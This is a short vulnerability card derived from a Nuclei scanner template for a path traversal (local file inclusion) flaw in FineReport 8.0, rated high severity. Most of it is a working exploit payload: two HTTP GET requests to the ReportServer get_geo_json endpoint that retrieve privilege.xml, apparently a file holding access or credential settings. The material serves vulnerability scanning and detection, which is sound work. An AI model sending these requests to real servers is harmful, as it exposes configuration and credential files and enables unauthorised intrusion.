# Nuclei Template: FineReport 8.0 - Local File Inclusion
**Template ID:** finereport-path-traversal
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`finereport-path-traversal.yaml`)

## Vulnerability Information & PoC

## Description
FIneReport  8.0 is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
GET {{BaseURL}}/report/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
```

## References
- https://web.archive.org/web/20200506020241/http://foreversong.cn/archives/1378
